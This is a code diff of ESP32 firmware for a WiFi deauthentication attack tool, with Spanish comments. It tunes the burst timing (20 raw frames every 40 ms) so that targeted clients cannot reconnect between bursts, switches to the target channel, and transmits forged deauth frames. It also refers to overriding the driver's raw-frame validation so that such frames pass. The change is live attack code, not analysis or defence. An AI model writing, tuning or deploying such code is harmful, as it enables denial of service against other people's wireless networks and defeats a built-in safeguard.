@@ -3,6 +3,18 @@
 #include <string.h>
 #include "esp_wifi.h"
 
+// Ritmo del ataque, local a este archivo a proposito (no depende de
+// que el header declare nada): cada cuanto sale una rafaga, cuantas
+// tramas lleva y cuanto se espacia cada una. 20 tramas cada 40ms
+// alcanza para que un cliente normal no llegue a reautenticar entre
+// rafaga y rafaga, sin saturar el aire.
+//
+// Nombres sin el prefijo DEAUTH_ para no chocar si en algun momento
+// el header tambien los define como macro.
+static const unsigned long INTERVALO_MS = 40;
+static const int           RAFAGA       = 20;
+static const unsigned long ESPACIO_US   = 500;
+
 // El driver valida las tramas crudas antes de transmitirlas y
 // descarta las que no le cierran. Esta funcion es un simbolo debil de
 // la libreria de WiFi: redefinirla para que devuelva siempre 0
@@ -86,7 +98,7 @@ void Deauther::detener() {
 
 void Deauther::update() {
     if (!atacando) return;
-    if (millis() - ultimoEnvio < DEAUTH_INTERVALO_MS) return;
+    if (millis() - ultimoEnvio < INTERVALO_MS) return;
     ultimoEnvio = millis();
 
     // Revalidar en cada rafaga: entre una y otra pudo pasar un conteo
@@ -101,12 +113,12 @@ void Deauther::update() {
         esp_wifi_set_channel(canalObjetivo, WIFI_SECOND_CHAN_NONE);
     }
 
-    for (int i = 0; i < DEAUTH_RAFAGA; i++) {
+    for (int i = 0; i < RAFAGA; i++) {
         if (esp_wifi_80211_tx(WIFI_IF_STA, &trama, sizeof(trama), false) == ESP_OK) {
             enviados++;
         } else {
             fallidos++;
         }
-        delayMicroseconds(DEAUTH_ESPACIO_US);
+        delayMicroseconds(ESPACIO_US);
     }
 }
